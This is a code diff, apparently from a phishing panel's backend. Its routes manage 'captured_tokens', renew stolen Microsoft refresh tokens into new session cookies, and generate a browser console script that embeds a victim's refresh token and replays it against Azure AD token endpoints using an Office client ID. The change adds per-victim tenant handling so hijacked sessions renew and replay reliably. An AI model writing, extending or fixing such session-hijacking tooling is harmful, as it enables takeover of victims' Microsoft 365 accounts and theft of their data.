@@ -21,7 +21,8 @@ router.get('/', userAuth, async (req, res) => {
     query += ' LIMIT ? OFFSET ?';
     params.push(parseInt(limit), offset);
     
-    const [tokens] = await db.query(query, params);
+    // Also select tenant field for renewal use
+    const [tokens] = await db.query(query.replace('SELECT id', 'SELECT id, tenant'), params);
     const [countResult] = await db.query('SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
     
     res.json({
@@ -366,8 +367,8 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         const cookieConverter = require('../services/cookieconverter');
         const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
         
-        // Convert refresh token to new cookies
-        const result = await cookieConverter.convertTokensToCookies(refreshToken, templateType);
+        // Convert refresh token to new cookies using stored tenant
+        const result = await cookieConverter.convertTokensToCookies(refreshToken, templateType, token.tenant || 'common');
         
         if (result.success && result.cookies) {
           // Update token in database with new cookies AND new tokens
@@ -496,6 +497,9 @@ router.get('/inject-script', userAuth, async (req, res) => {
     // Get client_id from config (same one used in device code flow)
     const clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 
+    // Use the token's stored tenant for correct Azure AD endpoint
+    const tokenTenant = token.tenant || 'common';
+
     // Generate the one-shot console script with relative URLs for same-origin cookie storage
     const script = `(async function() {
   const refreshToken = "${realRefreshToken}";
@@ -509,6 +513,7 @@ router.get('/inject-script', userAuth, async (req, res) => {
   });
 
   const endpoints = [
+    "/${tokenTenant}/oauth2/v2.0/token",
     "/common/oauth2/v2.0/token",
     "/consumers/oauth2/v2.0/token"
   ];
